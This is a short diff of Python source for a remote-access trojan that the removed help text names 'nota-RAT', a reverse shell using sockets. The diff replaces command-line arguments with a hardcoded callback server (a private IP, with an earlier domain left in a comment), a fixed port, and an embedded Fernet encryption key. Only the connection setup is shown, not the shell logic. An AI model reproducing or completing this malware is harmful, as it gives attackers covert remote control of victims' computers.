@@ -1,24 +1,9 @@
-import socket
-import os
-import subprocess
-import sys
-import argparse
+import os, subprocess, socket
 from cryptography.fernet import Fernet
 
 
-parser = argparse.ArgumentParser(
-    description="nota-RAT, python reverse shell using sockets."
-)
-
-parser.add_argument("host", default= "xn--6pw65a019d.xyz", nargs="?", help="Address of the Server.")
-
-parser.add_argument(
-    "-p", "--port", default=423, help="Port the Server is running on.", type=int
-)
-
-args = parser.parse_args()
-SERVER_HOST = args.host
-SERVER_PORT = args.port
+SERVER_HOST = '192.168.3.149'  #'xn--6pw65a019d.xyz'
+SERVER_PORT = 421
 BUFFER_SIZE = 1024 * 128 
 SEPARATOR = "<sep>"
 key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='
